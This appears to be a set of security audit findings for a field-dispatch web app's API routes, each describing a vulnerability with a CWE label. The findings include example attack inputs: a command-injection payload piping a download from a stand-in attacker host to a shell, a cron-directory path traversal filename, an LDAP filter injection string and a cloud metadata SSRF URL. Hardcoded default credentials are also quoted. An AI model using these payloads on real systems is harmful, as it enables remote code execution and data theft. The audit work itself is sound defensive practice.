extra.message: The `outputType` query parameter is concatenated directly into a shell command string (`tar -czf ${archivePath} --${format} -C ${archiveDir} .`) which is then executed via `spawn(cmd, [], { shell: true })`. No allowlist or sanitization is applied (unlike the sibling `/coverage-export` endpoint which validates against ALLOWED_PRESETS and uses `shell: false`). An authenticated ops_admin/dispatcher can pass shell metacharacters in `outputType` (e.g. `gzip -C /tmp; curl attacker.com/x|sh #`) to achieve arbitrary command execution on the server.

The uploaded file's original `data.filename` is used unsanitized to build the destination path (`resolve(archiveDir, data.filename)`), unlike the worker-certifications endpoint below it which correctly applies `path.basename()`. A filename such as `../../../../etc/cron.d/evil` lets an authenticated ops_admin/dispatcher write files outside the intended `incident-archive/<id>` directory anywhere the process has write access.

`data.filename` from the multipart upload is used directly in `resolve(iconDir, data.filename)` without calling `path.basename()` or otherwise stripping directory components. An ops_admin can supply a filename like `../../../app.ts` to write the uploaded file outside `service-icons/`, overwriting arbitrary files reachable from `UPLOAD_DIR`.

The `uid` query parameter is interpolated directly into an LDAP filter string (`(uid=${uid})`) without escaping. The adjacent `directory-lookup` endpoint correctly escapes user input with `escapeDirectoryFilter()` before building its filter, showing this path was intentionally skipped. An attacker can inject LDAP filter metacharacters (e.g. `*)(uid=*))(|(uid=*`) to alter query logic and enumerate/extract directory entries beyond the intended filter.

The destination URL for the server-side `fetch()` is taken from the attacker-controlled `x-webhook-callback` request header with no host/scheme allowlist, unlike `/verify-document-source` below which validates the target against `ALLOWED_HOSTS`. An ops_admin (or anyone who can reach this route) can point `callbackUrl` at internal-only services (e.g. `http://169.254.169.254/latest/meta-data/`, internal admin panels) causing the server to make requests on the attacker's behalf.

`getJobRateDetail` only requires `app.authenticate` (any logged-in role) with no ownership/role check on the job. Any customer or field worker can request `?dataLevel=full` for an arbitrary job `:id` and receive `internalNotes` and `priority` for jobs that do not belong to them, bypassing the ownership checks enforced on every other job-detail route (e.g. `/api/jobs/:id`).

cwe: CWE-639: Authorization Bypass Through User-Controlled Key

extra.message: `updateCustomerAccountSettings` only requires `app.authenticate` — there is no check that a `customer`-role caller owns customer `:id`, and no field allowlist: `Object.assign(customer, request.body || {})` merges the entire raw request body onto the customer record before saving. Any authenticated user (including a customer account) can update arbitrary fields (e.g. `userId`, `isActive`, `companyName`) on any other customer by supplying their ID.

cwe: CWE-639: Authorization Bypass Through User-Controlled Key
CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes

extra.message: The route-plan-snapshot token is decrypted with AES-256-CBC and no integrity/authentication tag, and the catch block distinguishes and returns a different, specific error message ("Snapshot padding invalid") when the decrypt fails due to bad PKCS#7 padding versus other parse failures. This observable difference lets an attacker submit crafted ciphertext and use the distinct responses as a padding oracle to decrypt or forge snapshot tokens without knowing `ROUTE_PLAN_KEY`.

The `export_name` query parameter is placed directly, unsanitized, into the `Content-Disposition` header value (`attachment; filename="${label}.txt"`). The sibling `/rate-sheet` endpoint sanitizes its equivalent label by stripping `[\r\n]` first; this endpoint does not. A value containing quote/CRLF characters lets an attacker break out of the filename attribute or inject additional header content in the HTTP response.

cwe: CWE-113: HTTP Response Splitting / Header Injection

extra.message: `servePartnerTrackingWidget` reflects any request `Origin` header verbatim into `Access-Control-Allow-Origin` with no allowlist, unlike `/status-widget` immediately below which checks the origin against `ALLOWED_STATUS_WIDGET_ORIGINS`. This permissive CORS configuration lets any website read job data cross-origin.

cwe: CWE-942: Permissive Cross-domain Policy with Untrusted Domains

extra.message: Verbose error detail including the full stack trace (`err.stack`) is returned to the client whenever the request carries a `diagnosticSession` cookie. Since cookies are entirely client-controlled, any authenticated user can set this cookie themselves to unlock internal stack traces and error internals for any route id, leaking implementation details useful for further attacks.

cwe: CWE-209: Generation of Error Message Containing Sensitive Information

extra.message: `onboardWorkerAccount` hashes the password with `bcrypt.hash(password, costFactor || 4)`, taking the bcrypt cost factor directly from the request body with a weak default of 4 (versus cost 10-12 used everywhere else in this file, e.g. lines 110, 158, 931, 1958). A low cost factor makes the resulting hash far cheaper to brute-force offline; an attacker-supplied `costFactor` also lets the caller pick an arbitrarily low value.

cwe: CWE-916: Use of Password Hash With Insufficient Computational Effort

extra.message: Customer accounts auto-created during CSV import are given the hardcoded password `'imported123'`. Anyone aware of this convention can log in as any imported customer without ever receiving a password reset, since there is no forced password change or reset-link flow triggered afterward.

`portalQuickAccessSessions` tokens are stored in-memory and never checked for expiration (unlike `workerShiftContexts`, which tracks and enforces `expiresAt`). Once issued, a quick-access token to a customer's job list remains valid indefinitely for the life of the server process, and the cookie that carries it is set without `httpOnly`/`secure`/`sameSite` flags (contrast with the `shiftContext` cookie at line 1349-1355), making it easier to steal and permanently reuse.

`JWT_SECRET` falls back to the hardcoded literal `'field-dispatch-dev-jwt-secret-change-in-production'` if the environment variable is unset. If this default ships to production, anyone can forge valid JWTs (including for the `ops_admin` role) using this publicly-visible secret.
